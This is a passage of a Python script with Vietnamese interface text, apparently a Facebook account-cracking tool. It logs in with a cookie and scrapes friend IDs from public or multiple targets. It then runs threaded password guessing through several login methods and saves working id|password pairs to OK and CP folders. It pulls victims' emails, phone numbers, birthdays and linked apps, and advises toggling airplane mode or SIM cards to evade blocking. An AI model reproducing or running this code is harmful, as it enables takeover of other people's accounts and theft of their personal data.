...
def login_lagi():
	try:
		banner()
		___kontol___ = input('[•] Nhập cookie : ')
		...
		print('\n ĐĂNG NHẬP THÀNH CÔNG');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print('%s# TÀI KHOẢN COOKIES / CP ĐÃ HẾT HẠN '%(h))
		exit()
...
def menu(my_name,my_id):
	...
	banner()
	sol()
	print(x+'['+h+'•'+x+'] Người dùng    : '+str(my_name))
	print(x+'['+h+'•'+x+'] Id Người dùng : '+str(my_id))
	print(x+'['+h+'•'+x+'] Địa chỉ IP  : '+str(sh['origin']))
	io = '[01] Crack Bạn Bè Công Khai\n[02] Những Người Bạn Của Công Chúng (Số lượng lớn)\n[03] Kiểm Tra Kết Quả Crack\n[04] Kiểm Tra Các Tùy Chọn Điểm Checkpoint\n[00] Đăng Xuất'
	...
	if jh in ['1','01']:
		...
		print(x+'['+h+'•'+x+'] Chờ đợi ...')
		time.sleep(1)
		sw = '# LOGOUT THÀNH CÔNG'
		sol().print(mark(sw, style='green'))
		exit()
	else:
		ric = '# LỰA CHỌN KHÔNG CÓ TRONG MENU'
		sol().print(mark(ric, style='red'))
		exit()

# RESULT CHECKER
def result():
	cek = '# KIỂM TRA KẾT QUẢ CRACK'
	sol().print(mark(cek, style='green'))
	kayes = '[01] Kiểm Tra Kết Quả Cp\n[02] Kiểm Tra Kết Quả Ok\n[00] Quay Lại Menu'
	kis = nel(kayes, style='cyan')
	cetak(nel(kis, title='KẾT QUẢ'))
	kz = input(x+'['+p+'f'+x+'] Lựa chọn : ')
	if kz in ['1','01']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			gada = '# HƯỚNG DẪN CHƯA TÌM HIỂU'
			sol().print(mark(gada, style='red'))
			time.sleep(2)
			back()
		if len(vin)==0:
			haha = '# BẠN KHÔNG CÓ KẾT QUẢ CP'
			sol().print(mark(haha, style='yellow'))
			time.sleep(2)
			back()
		else:
			gerr = '# KẾT QUẢ CP CỦA BẠN'
			...
			gerr2 = '# CHỌN KẾT QUẢ ĐỂ HIỂN THỊ'
			sol().print(mark(gerr2, style='green'))
			geeh = input(x+'['+p+'f'+x+'] Lựa chọn : ')
			try:geh = lol[geeh]
			except KeyError:
				ric = '# LỰA CHỌN KHÔNG CÓ TRONG MENU'
				sol().print(mark(ric, style='red'))
			...
			try:lin = open('CP/'+geh,'r').read()
				...
				hehe = '# KHÔNG TÌM HIỂU, KIỂM TRA & THỬ LẠI'
				sol().print(mark(hehe, style='red'))
				time.sleep(2)
				back()
			akun = '# DANH SÁCH TÀI KHOẢN CP CỦA BẠN'
			sol().print(mark(akun, style='green'))
			hus = os.system('cd CP && cat '+geh)
			akun2 = '# DANH SÁCH TÀI KHOẢN CP CỦA BẠN'
			sol().print(mark(akun, style='green'))
			input(x+'['+h+'•'+x+'] Kembali')
			back()
	elif kz in ['2','02']:
		try:vin = os.listdir('OK')
			...
			back()
		if len(vin)==0:
			haha = '# BẠN KHÔNG CÓ KẾT QUẢ ĐƯỢC'
			sol().print(mark(haha, style='yellow'))
			time.sleep(2)
			back()
		else:
			gerr = '# KẾT QUẢ OK CỦA BẠN'
			sol().print(mark(gerr, style='green'))
			cih = 0
			lol = {}
			for isi in vin:
				...
				if cih<100:
					...
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' ---> '+str(len(hem))+' Tài khoản'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' ---> '+str(len(hem))+' Tài khoản'+x)
			gerr2 = '# CHỌN KẾT QUẢ ĐỂ HIỂN THỊ'
			sol().print(mark(gerr2, style='green'))
			...
			try:lin = open('OK/'+geh,'r').read()
				...
				time.sleep(2)
				back()
			akun = '# DANH SÁCH TÀI KHOẢN OK CỦA BẠN'
			sol().print(mark(akun, style='green'))
			hus = os.system('cd OK && cat '+geh)
			akun2 = '# DANH SÁCH TÀI KHOẢN OK CỦA BẠN'
			sol().print(mark(akun, style='green'))
			input(x+'['+h+'•'+x+'] Trở về')
			back()
	elif kz in ['0','00']:
...
# OPEN
def file():
	tek = '# KIỂM TRA LỰA CHỌN TỪ TẬP TIN'
	sol().print(mark(tek, style='cyan'), style='on red')
	print(x+'['+h+'•'+x+'] Đang Đọc Tệp, Đợi Một Lát ...')
	time.sleep(2)
	teks = '# CHỌN LỌC ĐỂ KIỂM TRA'
	...
	try:
		mer = os.listdir('ĐƯỢC RỒI')
		for ty in mer:
			my_files.append(ty)
	except:pass
	if len(my_files)==0:
		yy = '# BẠN KHÔNG CÓ KẾT QUẢ ĐỂ KIỂM TRA'
		...
		for isi in my_files:
			try:hem = open('CP/'+isi,'r').readlines()
				...
				try:hem = open('ĐƯỢC RỒI/'+isi,'r').readlines()
				except:continue
			cih+=1
			if cih<10:
				nom = '0'+str(cih)
		...
		try:
			...
			try:
				hf = open('ĐƯỢC RỒI/'+geh,'r').readlines()
				for fz in hf:
					akun.append(fz.replace('\n',''))
				cek_opsi()
			except IOError:
...
def dump_publik():
	try:
		...
		exit()
	sol()
	print(x+'['+h+'•'+x+'] Nhập "tôi" nếu bạn muốn hủy ID từ bạn bè')
	pil = input(x+'['+p+'f'+x+'] Nhập ID mục tiêu : ')
	try:
		...
		for pi in koh2['bạn bè']['dữ liệu']:
			try:id.append(pi['id']+'|'+pi['tên'])
			except:continue
		print(x+'['+h+'•'+x+'] TOÀN BỘ : '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		li = '# VẤN ĐỀ KẾT NỐI INTERNET, KIỂM TRA VÀ THỬ LẠI'
		lo = mark(li, style='red')
		...
		teks = '# KHÔNG PHẢI LÀ BẠN BÈ CÔNG CỘNG HOẶC MÔI GIỚI'
...
def dump_massal():
	sol()
	print(x+'['+h+'•'+x+']NHẬP TỔNG SỐ ID (LIMIT 10)')
	try:
		jum = int(input(x+'['+p+'f'+x+'] CÓ BAO NHIÊU ID : '))
	except ValueError:
		pesan = '# ĐẦU VÀO BẠN NHẬP KHÔNG PHẢI LÀ MỘT SỐ'
		pesan2 = mark(pesan, style='red')
		sol().print(pesan2)
		exit()
	if jum<1 or jum>10:
		pesan = '# NGOÀI RANGE Nam'
		pesan2 = mark(pesan, style='red')
		sol().print(pesan2)
		exit()
	...
	for userr in uid:
		try:
			...
			li = '# VẤN ĐỀ KẾT NỐI INTERNET, KIỂM TRA & THỬ LẠI'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	tot = '# THU THẬP THÀNH CÔNG %s ID'%(len(id))
	if len(id)==0:
...
def setting():
	sol()
	teks = '[01] Crack từ tài khoản cũ nhất (không được khuyến nghị)\n[02] Crack từ tài khoản trẻ nhất (Khuyến nghị)\n[03] ID đơn đặt hàng ngẫu nhiên (được đề xuất cao)'
	tak = nel(teks, style='cyan')
	cetak(nel(tak, title=''))
	hu = input(x+'['+p+'f'+x+'] Lựa chọn : ')
	if hu in ['1','01']:
		for bacot in id:
			id2.append(bacot)
	elif hu in ['2','02']:
		...
		exit()
	sol()
	ioz = '[01] Phương pháp B-Fire (nhanh)\n[02] Method Mobile (chậm)\n[03] Phương pháp Facebook miễn phí'
	...
	if hc in ['1','01']:
		...
		method.append('miễn phí')
	else:
		method.append('điện thoại')
	sol()
	aplik = input(x+'╭─── Hiển thị các ứng dụng được liên kết? (y / n) : ')
	if aplik in ['y','Y']:
		taplikasi.append('ya')
	else:
		taplikasi.append('no')
	osk = input(x+'╰─── Hiển thị các tùy chọn điểm kiểm tra? (y / n) : ')
	if osk in ['y','Y']:
		oprek.append('ya')
	else:
		oprek.append('no')
...
# WORDLIST
def passwrd():
	ler = '# QUÁ TRÌNH CRACK BẮT ĐẦU, NHẤN CTRL + Z ĐỂ DỪNG'
	sol().print(mark(ler, style='green'))
	krek = 'Kết quả Trực tiếp được Lưu vào: OK/%s\nKiểm tra kết quả đã lưu vào: CP/%s\nBật / Tắt Chế độ Máy bay cứ sau 5 phút'%(okc,cpc)
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crack,idf,pwv)
	print('')
	tanya = '# MUỐN KIỂM TRA CÁC LỰA CHỌN KẾT QUẢ CRACK?'
	sol().print(mark(tanya, style='green'))
	woi = input(x+'['+p+'f'+x+'] Muốn Hiển thị Tùy chọn Kết quả Crack? (y / n) : ')
	if woi in ['y','Y']:
		cek_opsi()
	else:
		exit()
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				if 'no' in taplikasi:
					...
					infoakun += (f"[✓] Tên tài khoản       : {nama}\n[✓] Số lượng bạn bè    : {teman}\n[✓] Số người theo dõi : {pengikut}\n[✓] Email Hoạt động     : {email}\n[✓] Số hoạt động     : {nomer}\n[✓] Năm tài khoản      : {tahun}\n[✓] Ngày sinh   : {ttl}\n")

					hit1, hit2 = 0,0
					cek =session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					cek2 = session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					if "Đã truy cập bằng Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
						infoakun += (f"Ứng dụng liên quan *\n")
						if "Bạn không có ứng dụng hoặc trang web đang hoạt động để xem xét." in cek:
							infoakun += (f"Không có ứng dụng đang hoạt động nào được liên kết *\n")
						else:
							infoakun += (f"	Ứng dụng đang hoạt động : \n")
							...
							for muncul in apkAktif:
								...
								hit2+=1
						if "Bạn không có ứng dụng hoặc trang web đã hết hạn để xem xét" in cek2:
							infoakun += (f"\nKhông có ứng dụng hết hạn nào được liên kết\n")
						else:
							hit1,hit2=0,0
							infoakun += (f"	Ứng dụng đã hết hạn :\n")
...
def ceker(idf,pw):
	...
	try:
		...
		kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['hoạt động']), data=data, headers=head).text,'html.parser')
		...
		print('\r%s╰─── %s|%s ----> CP       %s'%(b,idf,pw,x))
		print('\r%s╰─── Không thể kiểm tra tùy chọn (Kiểm tra đăng nhập trong Lite / Mbasic)%s'%(u,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
...
def cek_opsi():
	c = len(akun)
	hu = 'Có %s Tài khoản để Kiểm tra\nTrước khi bắt đầu, Chế độ máy bay/Thay đổi thẻ sim trước tiên'%(c)
	cetak(nel(hu, title='KIỂM TRA CÁC LỰA CHỌN'))
	input(x+'['+h+'•'+x+'] Bắt đầu')
	cek = '# QUY TRÌNH KIỂM TRA LỰA CHỌN BẮT ĐẦU'
	sol().print(mark(cek, style='green'))
	love = 0
	for kes in akun:
		try:
			try:
				...
				time.sleep(2)
				print('\r%s╰─── %s ----> Lỗi      %s'%(b,kes,x))
				print('\r%s╰─── Bộ tách không được hỗ trợ cho chương trình này%s'%(u,x))
				continue
			bi = random.choice([u,k,kk,b,h,hh])
			...
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					...
					print('\r%s╰───  %s|%s ----> CP       %s'%(b,id,pw,x))
					print('\r%s╰───  Không thể kiểm tra các tùy chọn%s'%(u,x))
			elif "c_user" in ses.cookies.get_dict().keys():
				print('\r%s╰───  %s|%s ----> OK       %s'%(h,id,pw,x))
			else:
				print('\r%s╰───  %s|%s ----> SAI LẦM       %s'%(x,id,pw,x))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
			li = '# VẤN ĐỀ KẾT NỐI INTERNET, KIỂM TRA & THỬ LẠI'
